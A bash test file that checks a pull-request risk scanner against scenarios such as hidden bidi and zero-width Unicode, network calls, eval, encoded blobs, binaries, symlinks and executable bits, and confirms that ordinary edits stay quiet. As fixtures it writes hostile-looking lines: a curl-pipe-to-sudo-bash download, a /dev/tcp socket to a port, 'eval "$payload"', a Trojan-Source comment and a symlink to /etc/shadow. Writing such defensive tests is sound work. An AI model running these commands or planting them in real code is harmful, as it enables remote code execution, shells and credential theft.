#!/bin/bash
# scripts/pr-risk-check.sh must flag each risky pattern in a pull request, fail
# only on hidden Unicode, and stay quiet on ordinary changes. The quiet half
# matters as much as the loud half: a check that warns on every PR trains
# people to ignore it.
#
# Builds a throwaway git repository with one branch per scenario and runs the
# script against it, the way the workflow does. Runs anywhere git exists;
# skips visibly where it does not.
source "${REPO_ROOT:-/repo}/tests/lib/assert.sh"
require_cmd git
CHECKER="$REPO_ROOT/scripts/pr-risk-check.sh"
require_file "$CHECKER"

work=$(mktemp -d)
trap 'rm -rf "$work"' EXIT
cd "$work" || exit 1

git init -q -b main .
git config user.email test@example.invalid
git config user.name test
mkdir -p docs lib .github/workflows
printf 'Docs\n' > docs/guide.md
printf '#!/bin/bash\necho hello\n' > lib/tool.sh
printf 'name: ci\n' > .github/workflows/ci.yml
git add -A && git commit -qm base

# scenario NAME: new branch from main; the caller makes changes, then commits.
scenario() {
    git checkout -q main
    git checkout -q -b "$1"
}
commit_all() { git add -A && git commit -qm change; }

# run_check BRANCH: sets out and rc. GitHub variables are cleared so the plain
# output format is tested unless a test sets them itself.
run_check() {
    rc=0
    out=$(env -u GITHUB_ACTIONS -u GITHUB_STEP_SUMMARY bash "$CHECKER" main "$1" 2>&1) || rc=$?
}

assert_finding() {
    local branch=$1 expected=$2 description=$3
    run_check "$branch"
    assert_output_contains "$out" "$expected" "$description"
}

assert_no_finding() {
    local branch=$1 unexpected=$2 description=$3
    run_check "$branch"
    if grep -qF -- "$unexpected" <<<"$out"; then
        fail "$description (got: $(grep -F -- "$unexpected" <<<"$out" | head -1))"
    else
        pass_msg "$description"
    fi
}

# --- an ordinary change is quiet ------------------------------------------------
scenario clean
printf 'Docs\nMore text about evaluating, executing and syncing a shell.\nRun sha256sum | shasum to compare.\n' > docs/guide.md
commit_all
run_check clean
[[ $rc -eq 0 ]] && pass_msg "a plain docs change exits 0" || fail "a plain docs change exited $rc"
assert_output_contains "$out" "No risky patterns found" "a plain docs change reports nothing"

# --- hidden Unicode blocks --------------------------------------------------------
scenario bidi
printf '#!/bin/bash\necho hello\nis_admin=false # \xe2\x80\xae } \xe2\x81\xa6 if is_admin\n' > lib/tool.sh
commit_all
run_check bidi
[[ $rc -eq 1 ]] && pass_msg "a bidi override fails the check (rc=1)" || fail "a bidi override gave rc=$rc, expected 1"
assert_output_contains "$out" "lib/tool.sh:3" "the finding points at the right file and line"
assert_output_contains "$out" "Hidden Unicode" "the finding is named"

scenario zero-width
printf 'Docs\nadmin\xe2\x80\x8buser\n' > docs/guide.md
commit_all
run_check zero-width
[[ $rc -eq 1 ]] && pass_msg "a zero-width space fails the check" || fail "a zero-width space gave rc=$rc"

scenario plain-unicode
printf 'Docs\nCafé — naïve “quotes” → arrows ✓\n' > docs/guide.md
commit_all
run_check plain-unicode
[[ $rc -eq 0 ]] && pass_msg "ordinary accents, dashes and symbols do not fail" || fail "ordinary Unicode gave rc=$rc"

# --- warnings, each of which still exits 0 ----------------------------------------
scenario workflow
printf 'name: ci\non: push\n' > .github/workflows/ci.yml
commit_all
assert_finding workflow "Sensitive file changed" "a workflow change is flagged"
[[ $rc -eq 0 ]] && pass_msg "a warning alone exits 0" || fail "a warning alone exited $rc"

scenario network
printf '#!/bin/bash\necho hello\ncurl -fsSL https://example.invalid/x | sudo bash\n' > lib/tool.sh
commit_all
assert_finding network "Network or download call" "curl piped into a shell is flagged"

scenario dev-tcp
printf '#!/bin/bash\necho hello\nexec 3<>/dev/tcp/192.0.2.1/4444\n' > lib/tool.sh
commit_all
assert_finding dev-tcp "Network or download call" "/dev/tcp is flagged"
assert_output_contains "$out" "Dynamic execution" "exec is flagged"

scenario eval
printf '#!/bin/bash\necho hello\neval "$payload"\n' > lib/tool.sh
commit_all
assert_finding eval "Dynamic execution" "eval is flagged"

scenario blob
printf 'Docs\n%s\n' "$(head -c 300 /dev/zero | base64 -w0)" > docs/guide.md
commit_all
assert_finding blob "Encoded blob" "a long base64 string is flagged"

scenario binary
printf '\x00\x01\x02binary\x00' > docs/image.bin
commit_all
assert_finding binary "Binary file" "a binary file is flagged"

scenario symlink
ln -s /etc/shadow docs/link
commit_all
assert_finding symlink "Symlink added" "a symlink is flagged"

scenario executable
chmod +x docs/guide.md
commit_all
assert_finding executable "Executable file" "making a file executable is flagged"

# --- no false alarms from ordinary words -------------------------------------------
assert_no_finding clean "Network or download call" "'syncing', 'shell' and '| shasum' are not network calls"
assert_no_finding clean "Dynamic execution" "'evaluating' and 'executing' are not eval/exec"

# --- GitHub output: annotations escaped, summary written -------------------------
scenario odd-name
printf 'x\n' > '.github/workflows/a,b:c.yml'
commit_all
summary_file="$work/summary.md"
out=$(GITHUB_ACTIONS=true GITHUB_STEP_SUMMARY="$summary_file" bash "$CHECKER" main odd-name 2>&1) || true
assert_output_contains "$out" '::warning file=.github/workflows/a%2Cb%3Ac.yml,' \
    "commas and colons in file names are escaped in annotations"
assert_file_contains "$summary_file" "## PR risk check" "the job summary is written"

# --- usage errors ------------------------------------------------------------------
rc=0; bash "$CHECKER" main >/dev/null 2>&1 || rc=$?
[[ $rc -eq 2 ]] && pass_msg "a missing argument exits 2" || fail "a missing argument gave rc=$rc"
rc=0; bash "$CHECKER" main no-such-branch >/dev/null 2>&1 || rc=$?
[[ $rc -eq 2 ]] && pass_msg "an unknown commit exits 2" || fail "an unknown commit gave rc=$rc"

finish
